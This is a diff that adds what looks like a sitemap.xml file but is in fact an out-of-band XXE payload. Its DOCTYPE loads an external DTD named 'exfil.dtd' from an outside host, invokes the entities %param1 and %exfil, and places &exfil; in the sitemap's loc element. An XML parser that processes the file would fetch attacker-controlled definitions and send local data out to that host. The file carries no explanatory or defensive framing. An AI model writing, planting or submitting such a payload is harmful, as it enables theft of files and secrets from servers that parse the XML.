@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE urlset [
+<!ENTITY % dtd SYSTEM "http://h1.onedu.vn/exfil.dtd">
+%dtd;
+%param1;
+%exfil;
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+<url>
+    <loc>&exfil;</loc>
+    <lastmod>2019-06-19</lastmod>
+    <changefreq>daily</changefreq>
+</url>
